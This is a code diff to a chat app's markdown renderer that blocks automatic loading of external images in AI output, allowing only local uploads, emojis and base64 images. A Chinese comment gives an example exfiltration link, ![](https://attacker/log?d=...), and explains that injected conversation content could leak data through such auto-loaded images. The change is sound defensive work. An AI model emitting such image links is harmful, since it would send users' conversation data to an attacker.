@@ -505,6 +505,20 @@ async function copyAnswer(m) {
 // ---------- Markdown（markdown-it + Prism 语法高亮，均在 node_modules，无需额外安装） ----------
 // html:false 防 XSS（AI 输出按纯文本解析）；linkify 自动识别裸链接；breaks 单换行即 <br> 贴合聊天排版
 const md = new MarkdownIt({ html: false, linkify: true, breaks: true })
+// 外部图片不自动加载：markdown 的 ![](https://attacker/log?d=...) 会被浏览器自动请求，
+// 被注入的对话内容可能借此外泄（外部复审 2026-10-07）。只放行本站 /uploads /emojis，
+// 其余降级为纯文本链接（点击才会访问）。
+const LOCAL_IMG_RE = /^\/(uploads|emojis)\//i
+const defaultRenderImage = md.renderer.rules.image
+md.renderer.rules.image = (tokens, idx, opts, env, self) => {
+  const src = tokens[idx].attrGet('src') || ''
+  if (LOCAL_IMG_RE.test(src) || /^(data:image\/(png|jpe?g|gif|webp|bmp);base64,)/i.test(src)) {
+    return defaultRenderImage(tokens, idx, opts, env, self)
+  }
+  const href = md.utils.escapeHtml(src)
+  return '<a href="' + href + '" target="_blank" rel="noopener noreferrer">[外部图片，点击查看]</a>'
+}
+
 // 代码块保留原 .md-code-block / .md-copy-btn / .md-code 结构，复用既有复制逻辑与样式；指定语言时用 Prism 上色
 function highlightCode(code, lang) {
   const l = (lang || '').toLowerCase()
